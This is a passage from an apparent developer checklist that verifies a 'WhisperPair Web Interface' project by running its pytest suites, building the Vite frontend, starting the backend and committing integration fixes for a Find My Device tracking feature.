Run: `cd "<repo-root>" && python -m pytest test_adb_manager.py test_fast_pair_demo.py -v`
Expected: All tests PASS

- [ ] **Step 2: Verify frontend builds cleanly**

Run: `cd "<repo-root>/frontend" && npx vite build`
Expected: Build succeeds, no warnings about missing imports

- [ ] **Step 3: Verify backend starts**

Run: `cd "<repo-root>" && timeout 3 python app.py 2>&1 || true`
Expected: Output includes "WhisperPair Web Interface - Backend" without import errors

- [ ] **Step 4: Final commit if any fixes were needed**

```bash
git add -A
git commit -m "fix: integration fixes for Find My Device tracking feature"
```
